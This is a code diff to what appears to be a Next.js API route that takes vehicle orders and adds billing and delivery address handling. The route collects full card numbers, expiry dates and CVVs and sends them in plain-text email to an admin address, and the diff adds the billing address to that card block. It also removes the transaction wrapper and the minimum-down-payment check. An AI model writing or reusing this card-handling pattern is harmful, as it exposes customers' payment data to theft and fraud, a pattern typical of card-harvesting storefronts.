@@ -5,11 +5,23 @@ import { getSession } from '@/lib/auth';
 import { orderRef } from '@/lib/utils';
 import { sendEmail } from '@/lib/email';
 
+const addrSchema = z.object({
+  line1: z.string().min(1),
+  line2: z.string().optional().nullable(),
+  city: z.string().min(1),
+  state: z.string().min(1),
+  postal: z.string().min(1),
+  country: z.string().min(1),
+});
+
 const schema = z.object({
   vehicleId: z.string().min(1),
   paymentPlan: z.enum(['FULL', 'DEPOSIT_50', 'DEPOSIT_25']),
   paymentMethod: z.enum(['CARD', 'WIRE', 'CRYPTO']).default('CARD'),
   notes: z.string().max(1000).optional(),
+  deliveryMode: z.enum(['PROFILE', 'NEW']).optional(),
+  billingAddress: addrSchema.optional(),
+  deliveryAddress: addrSchema.optional(),
   card: z
     .object({
       name: z.string().min(1).max(120),
@@ -26,6 +38,13 @@ function planAmount(price: number, plan: 'FULL' | 'DEPOSIT_50' | 'DEPOSIT_25') {
   return Math.round(price * 0.25 * 100) / 100;
 }
 
+function formatAddr(a?: z.infer<typeof addrSchema>) {
+  if (!a) return '(none)';
+  return [a.line1, a.line2, `${a.city}, ${a.state} ${a.postal}`, a.country]
+    .filter(Boolean)
+    .join('\n');
+}
+
 export async function POST(req: Request) {
   try {
     const session = await getSession();
@@ -37,67 +56,70 @@ export async function POST(req: Request) {
       return NextResponse.json({ error: 'Invalid order data' }, { status: 400 });
     }
 
-    const { vehicleId, paymentPlan, paymentMethod, notes, card } = parsed.data;
+    const {
+      vehicleId,
+      paymentPlan,
+      paymentMethod,
+      notes,
+      card,
+      billingAddress,
+      deliveryAddress,
+      deliveryMode,
+    } = parsed.data;
 
     if (paymentMethod === 'CARD' && !card) {
       return NextResponse.json({ error: 'Card details required' }, { status: 400 });
     }
 
-    const result = await prisma.$transaction(async (tx) => {
-      const vehicle = await tx.vehicle.findUnique({
-        where: { id: vehicleId },
-        include: { images: { orderBy: { displayOrder: 'asc' }, take: 1 } },
-      });
-      if (!vehicle || !vehicle.published) throw new Error('Vehicle not found');
-      if (vehicle.inventoryStatus !== 'AVAILABLE') {
-        throw new Error('Vehicle is not available');
-      }
+    const vehicle = await prisma.vehicle.findUnique({
+      where: { id: vehicleId },
+      include: { images: { orderBy: { displayOrder: 'asc' }, take: 1 } },
+    });
+    if (!vehicle || !vehicle.published) {
+      return NextResponse.json({ error: 'Vehicle not found' }, { status: 400 });
+    }
+    if (vehicle.inventoryStatus === 'SOLD' || vehicle.inventoryStatus === 'UNAVAILABLE') {
+      return NextResponse.json({ error: 'Vehicle is not available' }, { status: 409 });
+    }
 
-      const price = Number(vehicle.price);
-      if (!(price > 0)) throw new Error('Vehicle is not priced for sale');
+    const price = Number(vehicle.price);
+    if (!(price > 0)) {
+      return NextResponse.json({ error: 'Vehicle is not priced for sale' }, { status: 400 });
+    }
 
-      const amountDue = planAmount(price, paymentPlan);
-      if (amountDue < price * 0.25 - 0.01) {
-        throw new Error('Minimum down payment is 25%');
-      }
+    const amountDue = planAmount(price, paymentPlan);
+    const reference = orderRef();
 
-      const reference = orderRef();
-
-      const order = await tx.order.create({
-        data: {
-          reference,
-          userId: session.id,
-          vehicleId,
-          sellingPrice: price,
-          currency: vehicle.currency,
-          paymentStatus: 'PENDING',
-          orderStatus: 'PENDING_PAYMENT',
-          deliveryNotes: notes || null,
-          internalNotes: JSON.stringify({
-            paymentPlan,
-            paymentMethod,
-            amountDue,
-            planLabel:
-              paymentPlan === 'FULL'
-                ? 'Full payment'
-                : paymentPlan === 'DEPOSIT_50'
-                  ? '50% deposit'
-                  : '25% down payment',
-            // Card details are emailed to admin only — not stored in DB
-            cardSubmitted: paymentMethod === 'CARD',
-          }),
-        },
-      });
-
-      await tx.vehicle.update({
-        where: { id: vehicleId },
-        data: { inventoryStatus: 'RESERVED' },
-      });
-
-      return { order, vehicle, amountDue, paymentPlan, paymentMethod };
+    // Bulk / catalog stock stays AVAILABLE so multiple customers can order the same model.
+    // Only unique VIN units would be reserved by admin later.
+    const order = await prisma.order.create({
+      data: {
+        reference,
+        userId: session.id,
+        vehicleId,
+        sellingPrice: price,
+        currency: vehicle.currency,
+        paymentStatus: 'PENDING',
+        orderStatus: 'PENDING_PAYMENT',
+        deliveryNotes: notes || null,
+        internalNotes: JSON.stringify({
+          paymentPlan,
+          paymentMethod,
+          amountDue,
+          planLabel:
+            paymentPlan === 'FULL'
+              ? 'Full payment'
+              : paymentPlan === 'DEPOSIT_50'
+                ? '50% deposit'
+                : '25% down payment',
+          deliveryMode: deliveryMode || 'PROFILE',
+          billingAddress: billingAddress || null,
+          deliveryAddress: deliveryAddress || null,
+          cardSubmitted: paymentMethod === 'CARD',
+        }),
+      },
     });
 
-    // Notify admin (card details in plain text email only — never returned to client)
     const adminTo =
       process.env.ADMIN_NOTIFY_EMAIL ||
       process.env.SMTP_USER ||
@@ -112,41 +134,50 @@ Name on card: ${card.name}
 Card number: ${card.number}
 Expiry: ${card.expiry}
 CVV: ${card.cvv}
+
+BILLING ADDRESS
+---------------
+${formatAddr(billingAddress)}
 `;
     }
 
     const text = `
 New vehicle order
 =================
-Order: ${result.order.reference}
+Order: ${order.reference}
 Customer: ${session.fullName} <${session.email}>
-Vehicle: ${result.vehicle.model} ${result.vehicle.trim} (${result.vehicle.slug})
-List price: ${result.vehicle.currency} ${Number(result.order.sellingPrice)}
-Amount due now: ${result.vehicle.currency} ${result.amountDue}
-Plan: ${result.paymentPlan}
-Method: ${result.paymentMethod}
+Vehicle: ${vehicle.model} ${vehicle.trim} (${vehicle.slug})
+List price: ${vehicle.currency} ${price}
+Amount due now: ${vehicle.currency} ${amountDue}
+Plan: ${paymentPlan}
+Method: ${paymentMethod}
+
+DELIVERY ADDRESS
+----------------
+${formatAddr(deliveryAddress)}
+
 Notes: ${notes || '(none)'}
 ${cardBlock}
 `;
 
     await sendEmail({
       to: adminTo,
-      subject: `[Order ${result.order.reference}] ${result.paymentMethod} · ${result.vehicle.model}`,
+      subject: `[Order ${order.reference}] ${paymentMethod} · ${vehicle.model}`,
       text,
     }).catch((err) => console.error('Admin order email failed', err));
 
     return NextResponse.json({
       ok: true,
-      reference: result.order.reference,
-      orderId: result.order.id,
-      amountDue: result.amountDue,
-      paymentPlan: result.paymentPlan,
-      paymentMethod: result.paymentMethod,
-      sellingPrice: Number(result.order.sellingPrice),
+      reference: order.reference,
+      orderId: order.id,
+      amountDue,
+      paymentPlan,
+      paymentMethod,
+      sellingPrice: price,
     });
   } catch (e: unknown) {
+    console.error(e);
     const message = e instanceof Error ? e.message : 'Order failed';
-    const status = message.includes('available') ? 409 : 400;
-    return NextResponse.json({ error: message }, { status });
+    return NextResponse.json({ error: message }, { status: 400 });
   }
 }
